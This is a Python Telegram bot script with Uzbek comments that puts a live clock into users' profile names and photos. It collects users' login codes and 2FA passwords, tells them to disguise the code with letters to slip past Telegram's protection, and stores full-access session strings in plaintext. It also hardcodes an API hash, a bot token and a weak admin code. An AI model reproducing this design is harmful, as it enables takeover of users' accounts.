# =====================================================================
# FULL SOAT BOT — MUKAMMAL VA ISHLAYDIGAN TAYYOR KOD (Aiogram 3 + Telethon)
# =====================================================================

import logging
import asyncio
import io
import sqlite3
from datetime import datetime
import pytz

from aiogram import Router, F, Bot, Dispatcher
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, 
    ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.filters import CommandStart, Command

from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from PIL import Image, ImageDraw, ImageFont

# Logging sozlamalari
logging.basicConfig(level=logging.INFO)

# Aiogram Router
router = Router()

# ---------------------------------------------------------------------
# CONFIGURATION (API Sozlamalarini shu yerga kiriting)
# ---------------------------------------------------------------------
API_ID = 1161696212               # my.telegram.org dan olingan API_ID
API_HASH = "b90611f46f1a08fe9584828ff1425bc4"     # my.telegram.org dan olingan API_HASH
BOT_TOKEN = "8518801019:AAEh9uq0drFoybCER4tNQxU5Ah1DCdIeWQ8"   # BotFather bergan TOKEN

DB_PATH = "soatbot.db"

# ---------------------------------------------------------------------
# FSM HOLATLARI (STATES)
# ---------------------------------------------------------------------
class RegistrationStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class PhotoClockStates(StatesGroup):
    waiting_photo = State()
    waiting_font_style = State()
    waiting_color = State()

class AdminStates(StatesGroup):
    waiting_code = State()
    giving_coins = State()

# Global saqlagichlar
_pending_clients = {}
_active_clock_tasks = {}
_user_profile_photos = {}

# ---------------------------------------------------------------------
# DATABASE MODULI (SQLITE)
# ---------------------------------------------------------------------
def db_execute(query: str, params: tuple = (), fetchone=False, fetchall=False, commit=False):
    conn = sqlite3.connect(DB_PATH, timeout=20)
    cursor = conn.cursor()
    cursor.execute(query, params)
    
    result = None
    if fetchone:
        result = cursor.fetchone()
    elif fetchall:
        result = cursor.fetchall()
        
    if commit:
        conn.commit()
        
    conn.close()
    return result

def init_db():
    db_execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            phone TEXT,
            session_string TEXT,
            coins INTEGER DEFAULT 0,
            clock_status TEXT DEFAULT 'stopped',
            clock_style INTEGER DEFAULT 1,
            photo_clock_active INTEGER DEFAULT 0,
            photo_style INTEGER DEFAULT 1,
            photo_color INTEGER DEFAULT 1
        )
    """, commit=True)
    
    db_execute("""
        CREATE TABLE IF NOT EXISTS system_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """, commit=True)
    
    db_execute("INSERT OR IGNORE INTO system_settings (key, value) VALUES ('admin_code', '1234')", commit=True)

init_db()

def get_setting(key: str) -> str:
    res = db_execute("SELECT value FROM system_settings WHERE key=?", (key,), fetchone=True)
    return res[0] if res else ""

def register_or_update_user(user_id: int, username: str):
    db_execute("""
        INSERT INTO users (user_id, username) VALUES (?, ?)
        ON CONFLICT(user_id) DO UPDATE SET username=excluded.username
    """, (user_id, username), commit=True)

def get_user_coins(user_id: int) -> int:
    res = db_execute("SELECT coins FROM users WHERE user_id=?", (user_id,), fetchone=True)
    return res[0] if res and res[0] is not None else 0

def add_user_coins(user_id: int, amount: int):
    db_execute("UPDATE users SET coins = COALESCE(coins, 0) + ? WHERE user_id=?", (amount, user_id), commit=True)

# ---------------------------------------------------------------------
# STYLES & COLOR PALETTES
# ---------------------------------------------------------------------
TIME_STYLES = {
    1: {"name": "1. Klassik", "digits": {"0": "0", "1": "1", "2": "2", "3": "3", "4": "4", "5": "5", "6": "6", "7": "7", "8": "8", "9": "9"}},
    2: {"name": "2. Kichik", "digits": {"0": "₀", "1": "₁", "2": "₂", "3": "₃", "4": "₄", "5": "₅", "6": "₆", "7": "₇", "8": "₈", "9": "₉"}},
    3: {"name": "3. Tepada", "digits": {"0": "⁰", "1": "¹", "2": "²", "3": "³", "4": "⁴", "5": "⁵", "6": "⁶", "7": "⁷", "8": "⁸", "9": "⁹"}},
    4: {"name": "4. Qavsli", "prefix": "[", "suffix": "]", "digits": {"0": "0", "1": "1", "2": "2", "3": "3", "4": "4", "5": "5", "6": "6", "7": "7", "8": "8", "9": "9"}}
}

COLOR_PALETTES = {
    1: {"name": "⚪️ Oq", "color": (255, 255, 255)},
    2: {"name": "🟡 Oltin", "color": (255, 215, 0)},
    3: {"name": "🔵 Moviy", "color": (0, 255, 255)},
    4: {"name": "🌸 Pushti", "color": (255, 105, 180)}
}

def format_time_for_nick(style_id: int) -> str:
    tashkent_tz = pytz.timezone("Asia/Tashkent")
    now = datetime.now(tashkent_tz)
    time_str = now.strftime("%H:%M")
    style = TIME_STYLES.get(style_id, TIME_STYLES[1])
    mapping = style.get("digits", {})
    formatted = "".join(mapping.get(char, char) for char in time_str)
    return f"{style.get('prefix', '')}{formatted}{style.get('suffix', '')}"

def draw_clock_on_image_centered(image_bytes: bytes, font_style_id: int, color_id: int) -> bytes:
    img = Image.open(io.BytesIO(image_bytes)).convert("RGB")
    draw = ImageDraw.Draw(img)
    tashkent_tz = pytz.timezone("Asia/Tashkent")
    now_time = datetime.now(tashkent_tz).strftime("%H:%M")
    
    width, height = img.size
    font_size = int(height * 0.14)
    
    try:
        font = ImageFont.truetype("arial.ttf", font_size)
    except IOError:
        font = ImageFont.load_default()
        
    text = f"{now_time}"
    if font_style_id == 2: text = f"• {now_time} •"
    elif font_style_id == 3: text = f"[{now_time}]"

    text_color = COLOR_PALETTES.get(color_id, COLOR_PALETTES[1])["color"]

    bbox = draw.textbbox((0, 0), text, font=font)
    text_width, text_height = bbox[2] - bbox[0], bbox[3] - bbox[1]
    
    x = (width - text_width) / 2
    y = (height - text_height) / 2
    
    padding = 15
    draw.rectangle([x - padding, y - padding, x + text_width + padding, y + text_height + padding], fill=(0, 0, 0, 140))
    draw.text((x, y), text, font=font, fill=text_color)
    
    output = io.BytesIO()
    img.save(output, format="JPEG", quality=95)
    return output.getvalue()

# ---------------------------------------------------------------------
# BACKGROUND TASK (SOATNI AVTOMATIK YANGILAB TURISH)
# ---------------------------------------------------------------------
async def run_user_clock_service(user_id: int, session_string: str):
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return

        me = await client.get_me()
        base_name = me.first_name.split()[0] if me and me.first_name else "User"

        last_min = -1
        while True:
            u_info = db_execute("SELECT clock_status, clock_style, photo_clock_active, photo_style, photo_color FROM users WHERE user_id=?", (user_id,), fetchone=True)
            if not u_info or u_info[0] != 'active':
                break

            status, style_id, photo_active, p_style, p_color = u_info
            tashkent_tz = pytz.timezone("Asia/Tashkent")
            now = datetime.now(tashkent_tz)

            if now.minute != last_min:
                # 1. Nik soati
                clock_text = format_time_for_nick(style_id or 1)
                try:
                    await client(functions.account.UpdateProfileRequest(first_name=f"{base_name} {clock_text}"))
                except Exception as e:
                    logging.error(f"Nik xatosi: {e}")

                # 2. Glavniy rasm soati
                if photo_active and user_id in _user_profile_photos and _user_profile_photos[user_id]:
                    try:
                        raw_photo = _user_profile_photos[user_id][0]
                        edited_bytes = draw_clock_on_image_centered(raw_photo, p_style or 1, p_color or 1)
                        
                        photos = await client.get_profile_photos('me')
                        if photos:
                            await client(functions.photos.DeletePhotosRequest(id=photos))

                        file = await client.upload_file(edited_bytes, file_name="profile_clock.jpg")
                        await client(functions.photos.UploadProfilePhotoRequest(file=file))
                    except Exception as e:
                        logging.error(f"Rasm xatosi: {e}")

                last_min = now.minute

            sleep_sec = 60 - now.second
            await asyncio.sleep(sleep_sec)

    except asyncio.CancelledError:
        pass
    except Exception as e:
        logging.error(f"Task xatosi ({user_id}): {e}")
    finally:
        if client.is_connected():
            await client.disconnect()

# ---------------------------------------------------------------------
# BOT HANDLERLARI
# ---------------------------------------------------------------------
@router.message(CommandStart())
async def start_cmd(message: Message):
    register_or_update_user(message.from_user.id, message.from_user.username)
    text = (
        "🤖 **JONLI SOAT BOTIGA XUSH KELIBSIZ!**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Profilingizga jonli Toshkent vaqtini o'rnating."
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Telegram ulanish", callback_data="login")],
        [InlineKeyboardButton(text="⚙️ Soat Sozlamalari", callback_data="main_clock_menu")],
        [InlineKeyboardButton(text="💰 Balans & Coin", callback_data="user_balance_menu")],
        [InlineKeyboardButton(text="🏆 Top Foydalanuvchilar", callback_data="show_leaderboard")]
    ])
    await message.answer(text, reply_markup=keyboard, parse_mode="Markdown")

@router.callback_query(F.data == "login")
async def start_registration(call: CallbackQuery, state: FSMContext):
    text = "🔐 **TELEGRAM BILAN ULANISH**\n\nIltimos, telefon raqamingizni yuboring:"
    keyboard = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="📱 Telefon raqamni yuborish", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True)
    await call.message.answer(text, reply_markup=keyboard, parse_mode="Markdown")
    await state.set_state(RegistrationStates.waiting_phone)
    await call.answer()

@router.message(RegistrationStates.waiting_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else message.text.strip()
    if not phone.startswith("+"): phone = "+" + phone

    msg = await message.answer("🔄 *Kod yuborilmoqda...*", parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        _pending_clients[message.from_user.id] = client
    except Exception as e:
        await msg.edit_text(f"❌ Xatolik: `{e}`", parse_mode="Markdown")
        await state.clear()
        return

    await state.update_data(phone=phone)
    await state.set_state(RegistrationStates.waiting_code)
    await msg.edit_text("📩 **Kodni kiriting:**\n(SMS orqali kelgan kodni harf aralashtirib yuboring, masalan: `5a4b3c`)", parse_mode="Markdown")

@router.message(RegistrationStates.waiting_code)
async def process_code(message: Message, state: FSMContext):
    extracted_code = "".join(filter(str.isdigit, message.text))
    data = await state.get_data()
    client = _pending_clients.get(message.from_user.id)

    if not client:
        await message.answer("❌ Sessiya eskirgan.")
        await state.clear()
        return

    try:
        await client.sign_in(phone=data.get("phone"), code=extracted_code)
    except SessionPasswordNeededError:
        await state.set_state(RegistrationStates.waiting_password)
        await message.answer("🔐 **2FA Parolingizni kiriting:**")
        return
    except Exception as e:
        await message.answer(f"❌ Xatolik: `{e}`")
        await state.clear()
        return

    session_string = client.session.save()
    db_execute("UPDATE users SET phone=?, session_string=? WHERE user_id=?", (data.get("phone"), session_string, message.from_user.id), commit=True)
    await client.disconnect()
    _pending_clients.pop(message.from_user.id, None)

    await message.answer("🎉 **Muvaffaqiyatli ulandi!**", parse_mode="Markdown")
    await state.clear()

@router.callback_query(F.data == "main_clock_menu")
async def show_main_clock_options(call: CallbackQuery):
    text = "⚙️ **SOAT SOZLAMALARI:**"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Nik soati", callback_data="set_nick_clock")],
        [InlineKeyboardButton(text="🖼 Glavniy rasm soati", callback_data="set_photo_clock")],
        [InlineKeyboardButton(text="⏹ Soatni o'chirish", callback_data="stop_clock")]
    ])
    await call.message.answer(text, reply_markup=keyboard, parse_mode="Markdown")
    await call.answer()

@router.callback_query(F.data == "set_nick_clock")
async def show_nick_clock_menu(call: CallbackQuery):
    text = "✏️ **Nik uchun stil tanlang:**\n"
    btns = []
    for s_id, s_data in TIME_STYLES.items():
        ex = format_time_for_nick(s_id)
        btns.append([InlineKeyboardButton(text=f"{s_data['name']} ({ex})", callback_data=f"select_style_{s_id}")])
    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="Markdown")
    await call.answer()

@router.callback_query(F.data.startswith("select_style_"))
async def select_nick_clock_style(call: CallbackQuery):
    style_id = int(call.data.split("_")[-1])
    user_id = call.from_user.id
    
    u = db_execute("SELECT session_string FROM users WHERE user_id=?", (user_id,), fetchone=True)
    if not u or not u[0]:
        await call.message.answer("⚠️ Avval ro'yxatdan o'ting!")
        await call.answer()
        return

    db_execute("UPDATE users SET clock_status='active', clock_style=? WHERE user_id=?", (style_id, user_id), commit=True)
    
    if user_id in _active_clock_tasks:
        _active_clock_tasks[user_id].cancel()
    
    task = asyncio.create_task(run_user_clock_service(user_id, u[0]))
    _active_clock_tasks[user_id] = task

    await call.message.answer("✅ **Nik soati ishga tushirildi!**", parse_mode="Markdown")
    await call.answer()

@router.callback_query(F.data == "stop_clock")
async def stop_clock_handler(call: CallbackQuery):
    user_id = call.from_user.id
    db_execute("UPDATE users SET clock_status='stopped', photo_clock_active=0 WHERE user_id=?", (user_id,), commit=True)
    
    if user_id in _active_clock_tasks:
        _active_clock_tasks[user_id].cancel()
        _active_clock_tasks.pop(user_id, None)

    await call.message.answer("⏹ **Barcha soatlar to'xtatildi!**", parse_mode="Markdown")
    await call.answer()

@router.callback_query(F.data == "user_balance_menu")
async def show_balance_menu(call: CallbackQuery):
    coins = get_user_coins(call.from_user.id)
    text = f"💰 **Balansingiz:** `{coins} Coin`"
    await call.message.answer(text, parse_mode="Markdown")
    await call.answer()

@router.callback_query(F.data == "show_leaderboard")
async def show_leaderboard_handler(call: CallbackQuery):
    top_users = db_execute("SELECT username, coins FROM users ORDER BY coins DESC LIMIT 5", fetchall=True)
    text = "🏆 **TOP-5 REYTING**\n\n"
    if top_users:
        for u_name, coins in top_users:
            text += f"• @{u_name or 'User'} — `{coins or 0} Coin`\n"
    await call.message.answer(text, parse_mode="Markdown")
    await call.answer()

# ---------------------------------------------------------------------
# ISHGA TUSHIRISH (MAIN)
# ---------------------------------------------------------------------
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    dp.include_router(router)
    
    logging.info("Bot tayyor va ishga tushirildi!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())